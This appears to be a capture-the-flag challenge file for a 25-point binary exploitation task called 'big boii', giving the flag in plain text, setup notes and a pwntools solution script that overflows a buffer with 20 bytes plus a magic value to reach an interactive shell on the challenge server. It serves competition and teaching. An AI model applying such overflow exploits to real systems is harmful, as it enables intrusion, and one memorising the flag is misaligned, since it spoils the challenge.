
# big boii

## Description

- Only big boi pwners will get this one!

## Points

- 25

## Flag

- flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}

## Setup

- Make sure that competitors can connect to the challenge

## Notes

- Mach-o 64-bit binary
- Provide dylibs to the competitors 
- Place all linux cmds that can read files to different directory

## Solution

```py
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

#p = process("./boi")
p = remote("pwn.chal.csaw.io", 9000)
#p = remote("localhost", 1436)
p.recvuntil("??")
print "before"
p.sendline('A' * 20 + p32(0xcaf3baee))
print "after"
p.interactive()
```